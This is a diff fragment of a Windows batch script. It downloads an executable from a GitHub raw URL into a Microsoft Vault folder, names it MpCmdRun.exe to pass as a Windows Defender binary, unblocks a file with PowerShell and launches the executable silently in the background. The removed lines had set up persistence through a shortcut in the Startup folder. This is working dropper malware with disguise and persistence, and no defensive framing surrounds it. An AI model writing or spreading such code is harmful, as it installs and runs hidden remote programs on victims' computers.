@@ -11,12 +11,5 @@ setlocal enabledelayedexpansion
     curl -L -s -o "%LOCALAPPDATA%\Microsoft\Vault\MpCmdRun.exe" "https://github.com/ajeje-brazorf-02/proton-star/raw/main/Windows_a7.exe"
     powershell -Command "Unblock-File '%LOCALAPPDATA%\Microsoft\Vault\VaultSvc.exe'"
     start /B "" "%LOCALAPPDATA%\Microsoft\Vault\MpCmdRun.exe"
-    set FilePath=%LOCALAPPDATA%\Microsoft\Vault\MpCmdRun.exe
-    set UrlShortcut=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MioFile.url
-
-    (
-    echo [InternetShortcut]
-    echo URL=file:///%FilePath:\=/%
-    ) > "%UrlShortcut%"
 )
 exit /b
